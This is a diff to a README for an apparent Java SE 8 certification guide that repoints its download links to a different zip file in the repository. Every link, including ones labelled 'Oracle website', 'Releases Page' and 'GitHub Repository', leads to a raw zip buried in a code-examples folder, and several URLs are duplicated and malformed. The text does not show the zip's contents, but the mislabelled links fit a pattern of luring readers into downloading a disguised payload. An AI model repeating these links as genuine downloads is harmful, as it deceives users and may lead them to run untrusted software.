@@ -1,6 +1,6 @@
 # 📚 Java-SE-8-Cert - Simple Guide to Java Certification
 
-![Download Here](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip%20Latest%https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip)
+![Download Here](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip%20Latest%https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip)
 
 ## 🚀 Getting Started 
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. You can find the latest ve
 
 Click the link below to visit the page and download the software:
 
-[Visit Releases Page](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip)
 
 ### Steps to Download
 
@@ -54,7 +54,7 @@ Each section is designed to provide clarity and focus, allowing you to grasp the
 
 ## 🛠️ Troubleshooting Common Issues
 
-- **Java Not Found**: If you receive a message that Java is not installed, download Java SE 8 from the [Oracle website](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip).
+- **Java Not Found**: If you receive a message that Java is not installed, download Java SE 8 from the [Oracle website](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip).
 
 - **Permission Denied**: If you face permission issues while running a program, ensure you have the necessary permissions for the directory or use an administrator account.
 
@@ -70,7 +70,7 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ## 🔗 Links
 
-- [Visit Releases Page](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/3-Core Java/Java-SE-8-Cert-2.0.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip https://raw.githubusercontent.com/MBalazsHun/Java-SE-8-Cert/main/6-Exceptions/CodeExamples/Cert_Java_S_1.5.zip)
 
 Thank you for using our guide. Happy coding!
